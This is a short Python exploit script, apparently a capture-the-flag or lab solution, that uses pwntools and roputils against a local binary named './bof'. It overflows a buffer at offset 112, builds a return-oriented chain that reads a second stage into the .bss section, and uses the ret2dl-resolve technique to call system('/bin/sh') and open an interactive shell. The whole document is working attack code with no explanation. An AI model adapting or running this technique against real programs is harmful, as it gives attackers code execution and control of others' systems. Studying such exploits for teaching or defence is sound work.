#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
import roputils as rp
context.log_level = "debug"

io = process("./bof")
offset = 112

rop = rp.ROP("./bof")
bss = rop.section(".bss")

payload = rop.fill(offset)
payload += rop.call('read', 0, bss, 100)
payload += rop.dl_resolve_call(bss + 20, bss)

io.sendlineafter("!\n", payload)

payload = rop.string("/bin/sh")
payload += rop.fill(20, payload)
payload += rop.dl_resolve_data(bss + 20, 'system')
payload += rop.fill(100, payload)

io.sendline(payload)
io.interactive()
io.close()
